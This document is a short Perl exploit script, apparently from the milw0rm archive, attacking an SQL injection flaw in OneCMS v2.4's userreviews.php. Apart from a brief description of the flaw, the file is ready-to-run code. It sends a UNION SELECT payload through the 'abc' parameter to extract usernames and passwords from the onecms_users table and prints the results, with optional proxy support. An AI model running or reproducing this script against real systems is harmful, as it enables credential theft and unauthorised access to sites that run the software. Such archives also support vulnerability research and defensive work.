#!/usr/bin/perl
#
# OneCMS v2.4 Remote SQL Injection Exploit
# 
# Description
# -----------
# OneCMS contains a flaw that allows an attacker to carry out an SQL 
# injection attack. The issue is due to the userreviews.php script not 
# properly sanitizing user-supplied input to the 'abc' variable. This may 
# allow an attacker to inject or manipulate SQL queries in the backend 
# database if magic_quotes_gpc = off.
# -----------
# $Id: milw0rm_onecms.pl,v 0.1 2007/09/19 15:02:12 str0ke Exp $

use strict;
use LWP::UserAgent;

my $target = shift || &usage();
my $proxy = shift;

&exploit($target); 

sub usage
{
	print "[?] OneCMS v2.4 Remote SQL Injection Exploit\n";
	print "[?] str0ke <str0ke[!]milw0rm.com>\n";
	print "[?] usage: perl $0 [target]\n";
	print "    [target] (ex. http://127.0.0.1/OneCMS)\n";
	print "    [proxy] (ex. 0.0.0.0:8080)\n";
	exit;
}

sub exploit
{
	my($target) = @_;

	my $conn = LWP::UserAgent->new() or die;
	$conn->agent("Mozilla/4.0 (compatible; Lotus-Notes/5.0; Windows-NT)");
	$conn->proxy("http", "http://".$proxy."/") unless !$proxy;
	
	my $out=$conn->get($target."/userreviews.php?abc=-1'%20union%20select%200,concat(0x3a,0x3a,0x3a,username,0x3a,password,0x3a,0x3a,0x3a)username,0,password,0,0,0,0,0%20from%20onecms_users/*");

	if ($out->content =~ m/:::(.*?):::/ms) {
		print $1 . "\n";
	} else { 
		print "Exploit Failed\n";
	}
}